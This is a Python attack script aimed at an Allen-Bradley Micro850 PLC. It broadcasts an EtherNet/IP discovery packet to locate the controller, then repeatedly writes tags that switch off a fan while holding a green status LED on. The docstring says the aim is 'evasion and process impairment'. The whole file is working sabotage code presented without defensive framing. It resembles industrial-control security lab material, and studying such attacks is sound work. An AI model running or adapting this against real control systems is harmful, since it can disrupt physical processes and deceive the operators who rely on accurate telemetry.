from scapy.all import *
from pylogix import PLC
import time

def find_plc_ip():
    """
    Scan the local network to identify an Allen-Bradley PLC (Micro850).
    Uses Ethernet/IP (CIP) detection.
    """
    broadcast_ip = "255.255.255.255"
    ether_ip_port = 44818  # Default EtherNet/IP port for Rockwell PLCs 
    
    # Create a UDP discovery packet to identify Rockwell PLCs
    discovery_packet = (
        b"\x63\x04" +  # Command: List Identity
        b"\x00\x00" +  # Session handle
        b"\x00\x00\x00\x00" +  # Status
        b"\x00\x00\x00\x00" +  # Sender Context
        b"\x00\x00\x00\x00"  # Options
    )

    # Sending discovery broadcast
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(3)  # Timeout for responses
    sock.sendto(discovery_packet, (broadcast_ip, ether_ip_port))

    try:
        while True:
            data, addr = sock.recvfrom(1024)
            if data and len(data) > 20:
                print(f"PLC Detected at: {addr[0]}")
                return addr[0]
    except socket.timeout:
        print("No PLC found on the network.")
        return None

def spoof_plc_reporting(plc_ip, spoof_value=True):
    """
    Spoofs PLC telemetry variables for evasion and process impairment.
    """
    plc = PLC()
    plc.IPAddress = plc_ip

    # Check connection
    try:
        response = plc.Read('Activate_FanA')
        if response.Status != "Success":
            print(f"Failed to read from PLC at {plc_ip}")
            return
        print(f"Connected to PLC at {plc_ip}")
    except Exception as e:
        print(f"Error connecting to PLC: {e}")
        return

    # Continuous spoofing of telemetry
    while True:
        if spoof_value:
            print("[+] Spoofing Reporting Messages: Setting Activate_FanA to FALSE")
            plc.Write('Activate_FanA', False)
            plc.Write('START', False)
            plc.Write('FanA_Off', True)
            plc.Write('_IO_EM_DO_02', False)  # Turn off Fan
            plc.Write('_IO_EM_DO_07', True)  # Keep Green LED ON (false positive)
        else:
            print("[+] Restoring Normal Operation")
            plc.Write('Activate_FanA', True)
            plc.Write('START', True)
            plc.Write('FanA_Off', False)
            plc.Write('_IO_EM_DO_02', True)  # Turn Fan ON
            plc.Write('_IO_EM_DO_07', False)  # Turn LED OFF

        time.sleep(5)  # Modify reporting values every 5 seconds 

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        spoof_plc_reporting(plc_ip)